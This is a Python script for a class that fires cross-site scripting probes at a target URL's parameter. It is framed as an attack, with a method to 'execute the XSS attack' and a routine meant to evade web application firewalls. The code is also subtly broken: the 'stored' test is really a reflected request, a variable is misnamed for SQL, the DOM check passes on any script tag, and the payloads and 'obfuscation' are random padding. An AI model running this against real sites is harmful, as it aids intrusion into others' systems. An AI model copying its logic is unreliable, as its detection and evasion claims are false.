import requests
import random
import string
import urllib.parse

class XSSAdvanced:
    def __init__(self, target_url, vulnerable_param, headers=None):
        self.target_url = target_url
        self.vulnerable_param = vulnerable_param
        self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0'}
    
    def generate_payload(self, length=12):
        """
        Generate a random string for XSS payload.
        """
        return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=length))

    def stored_xss(self, payload):
        """
        Test for Stored XSS vulnerability by injecting payload and checking the response.
        """
        sql_payload = f"{self.vulnerable_param}={payload}"
        url = f"{self.target_url}?{sql_payload}"
        
        try:
            response = requests.get(url, headers=self.headers)
            if payload in response.text:
                print(f"Stored XSS successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during Stored XSS test: {e}")
        return False

    def reflected_xss(self, payload):
        """
        Test for Reflected XSS vulnerability by injecting payload into URL or parameters.
        """
        payload_encoded = urllib.parse.quote(payload)
        url = f"{self.target_url}?{self.vulnerable_param}={payload_encoded}"
        
        try:
            response = requests.get(url, headers=self.headers)
            if payload in response.text:
                print(f"Reflected XSS successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during Reflected XSS test: {e}")
        return False

    def dom_based_xss(self, payload):
        """
        Perform DOM-based XSS detection using JavaScript payload.
        """
        js_payload = f"<script>{payload}</script>"
        url = f"{self.target_url}?{self.vulnerable_param}={js_payload}"
        
        try:
            response = requests.get(url, headers=self.headers)
            if "<script>" in response.text and "</script>" in response.text:
                print(f"DOS-based XSS successful with payload: {js_payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during DOM-based XSS test: {e}")
        return False

    def obfuscate_payload(self, payload):
        """
        Obfuscate the payload to evade detection systems like WAF.
        """
        obfuscated_payload = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + payload + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
        return obfuscated_payload

    def execute_xss_attack(self):
        """
        Execute the XSS attack with different techniques.
        """
        payload = self.generate_payload()

        # Attempt Stored XSS
        if self.stored_xss(payload):
            print(f"Stored XSS attack successful with payload: {payload}")
        
        # Attempt Reflected XSS
        if self.reflected_xss(payload):
            print(f"Reflected XSS attack successful with payload: {payload}")
        
        # Attempt DOM-based XSS
        if self.dom_based_xss(payload):
            print(f"DOS-based XSS attack successful with payload: {payload}")
        
        # Try with obfuscated payload to evade WAF
        obfuscated_payload = self.obfuscate_payload(payload)
        if self.reflected_xss(obfuscated_payload):
            print(f"Obfuscated XSS attack successful with payload: {obfuscated_payload}")
